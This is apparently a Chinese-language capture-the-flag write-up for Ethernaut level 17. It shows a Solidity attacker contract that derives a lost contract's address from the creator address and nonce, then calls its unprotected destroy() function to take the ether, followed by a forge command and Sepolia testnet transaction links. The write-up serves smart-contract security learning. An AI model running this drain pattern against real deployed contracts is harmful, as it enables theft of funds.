# Level 17

[The Ethernaut level 17](https://ethernaut.openzeppelin.com/level/17)

这一关的目的是取回第一个 `SimpleToken` 合约里的 ether，该合约提供了自毁方式可以提取属于资金。然而，该合约地址忘记了。
（吐槽下，合约地址忘记了的话查看区块链浏览器就可以找回了呀）

仔细阅读合约，`SimpleToken` 合约由 ` Recovery` 合约使用 `create` 操作码创建。要找回创建的合约地址的话，只需 `create` 中的两个关键参数：`sender` 和 `nonce`。前面提到了，是要找回第一个合约的地址，即第一笔交易，因此 `nonce = 1`。`sender` 自然是 `Recovery` 合约的地址。有了这两个关键参数后，合约地址就可以计算出来了。

攻击者合约：
```
contract Attacker {
    Recovery level;

    constructor(address level_) {
        level = Recovery(level_);
    }

    function attack() public {
        address payable lostContract = payable(address(
            uint160(uint256(keccak256(abi.encodePacked(bytes1(0xd6), bytes1(0x94), address(level), bytes1(0x01)))))
        ));

        SimpleToken(lostContract).destroy(payable(msg.sender));
    }
}
```

执行脚本：
```
forge script script/level17.s.sol:CallContractScript --rpc-url sepolia --broadcast
```

完整代码见：[这里](ethernaut/test/level17.s.sol)

链上记录：
- [level(`Recovery`)](https://sepolia.etherscan.io/address/0x5B78B2E2ccFD96d2a064A7c20f6eEFcDff851106)
- [Attacker](https://sepolia.etherscan.io/tx/0x662A79D0A3ecb09F7a92dC47707105591025A030)
- [attack 交易](https://sepolia.etherscan.io/tx/0x773ac711a60b45f253732a35011d117d88cfc5b68c042575ccf6aa93f6d9fdce)
- [找回的 SimpleToken 地址](https://sepolia.etherscan.io/address/0x9f7F48EEaF91fDc3Dd94Bfd9d601b54f9e08dB94)